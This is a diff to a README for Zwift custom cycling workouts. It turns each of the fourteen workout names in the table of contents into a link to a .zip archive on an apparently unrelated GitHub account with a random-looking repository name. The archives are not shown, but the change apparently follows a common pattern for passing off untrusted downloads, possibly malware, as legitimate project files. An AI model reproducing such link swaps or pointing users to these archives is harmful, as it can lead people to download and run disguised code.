@@ -19,19 +19,19 @@ Afterwards they'll appear in your workouts menu under "Custom Workouts".
 
 ## Table of contents
 
- - Active Offseason
- - Back To Fitness
- - Build Me Up
- - Crit Crusher
- - Dirt Destroyer
- - Fondo
- - FTP Builder
- - Gran Fondo
- - Gravel Grinder
- - Pebble Pounder
- - Singletrack Slayer
- - TT-TuneUp
- - Zwift 101
- - Zwift Racing
+ - [Active Offseason](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Active.Offseason.zip)
+ - [Back To Fitness](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Back.To.Fitness.zip)
+ - [Build Me Up](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Build.Me.Up.zip)
+ - [Crit Crusher](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Crit.Crusher.zip)
+ - [Dirt Destroyer](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Dirt.Destroyer.zip)
+ - [Fondo](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Fondo.zip)
+ - [FTP Builder](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/FTP.Builder.zip)
+ - [Gran Fondo](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Gran.Fondo.zip)
+ - [Gravel Grinder](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Gravel.Grinder.zip)
+ - [Pebble Pounder](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Pebble.Pounder.zip)
+ - [Singletrack Slayer](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Singletrack.Slayer.zip)
+ - [TT-TuneUp](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/TT.TuneUp.zip)
+ - [Zwift 101](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Zwift.101.Cycling.zip)
+ - [Zwift Racing](https://github.com/erksionvorseshan/vigilant-barnacle/releases/download/v0.1/Zwift.Racing.zip)
 
 Have fun, ride safe
